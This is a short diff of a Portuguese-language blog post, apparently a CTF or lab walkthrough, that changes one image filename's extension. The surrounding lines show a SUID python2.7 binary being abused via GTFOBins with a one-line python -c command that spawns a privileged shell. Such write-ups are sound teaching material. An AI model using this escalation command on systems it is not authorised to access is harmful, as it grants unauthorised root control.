@@ -55,7 +55,7 @@ Esconde os erros <code>2&gt;/dev/null</code></p>
 <h3 id="encontrando-e-explorando-um-privilege-escalation">Encontrando e explorando um privilege escalation</h3>
 <p>Olhando esses arquivos, um que chama atenção é o <code>/usr/bin/python2.7</code>.<br>
 Vamos verficiar se existe algum exploit conhecido para o python no <a href="https://gtfobins.github.io/gtfobins/python/#suid">GTFOBins</a>, site com várias formas de privilege escalation.</p>
-<p><img src="/images/posts/gtfobins-python.PNG" alt="GTFOBins Python"></p>
+<p><img src="/images/posts/gtfobins-python.png" alt="GTFOBins Python"></p>
 <p>Encontramos uma forma de escalar nossos privilégios!<br>
 Vamos executar o comando <code>python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;</code></p>
 <pre><code class="hljs language-sh">reddyyz@fsociety:~$ python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span>
